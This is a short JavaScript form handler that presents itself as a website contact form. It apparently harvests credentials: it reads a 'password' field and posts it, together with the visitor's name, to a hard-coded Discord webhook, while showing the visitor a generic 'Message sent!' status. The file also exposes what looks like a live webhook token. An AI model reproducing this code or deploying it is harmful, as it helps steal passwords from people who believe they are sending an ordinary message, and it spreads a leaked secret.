document.getElementById("messageForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent page refresh

    let name = document.getElementById("name").value;
    let message = document.getElementById("password").value;

    // Discord Webhook URL (Replace with your actual webhook)
    let webhookURL = "https://discord.com/api/webhooks/1356770268860907610/-SytiViEBktjuMT_0tnv7KIjFSjBQ5XQD925nptWkbM4wHZgeVYBKVj3ntvLh4kwO1b9";

    let payload = {
        content: `📩 **New Message from Website**\n👤 **Name:** ${name}\n💬 **Password:** ${message}\n...\n...`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            document.getElementById("status").innerText = "✅ Message sent!";
        } else {
            document.getElementById("status").innerText = "❌ Failed to send.";
        }
    })
    .catch(error => {
        console.error("Error:", error);
        document.getElementById("status").innerText = "❌ Error sending message.";
    });

    // Clear form fields
    document.getElementById("name").value = "";
    document.getElementById("password").value = "";
});